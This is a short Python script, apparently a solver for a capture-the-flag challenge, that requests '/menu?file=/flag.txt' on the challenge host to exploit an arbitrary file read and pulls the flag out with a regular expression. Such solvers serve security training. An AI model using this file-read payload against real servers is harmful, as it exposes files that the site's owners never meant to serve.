import os, requests, re

URL = os.environ.get("URL", "http://find-me.challs.olicyber.it")
if URL.endswith("/"):
    URL = URL[:-1]
r = requests.get(URL + "/menu?file=/flag.txt")

try:
    pattern = r'flag\{.*?\}'
    flag = re.findall(pattern, r.text)[0]
except:
    flag = "Not found"

print(flag)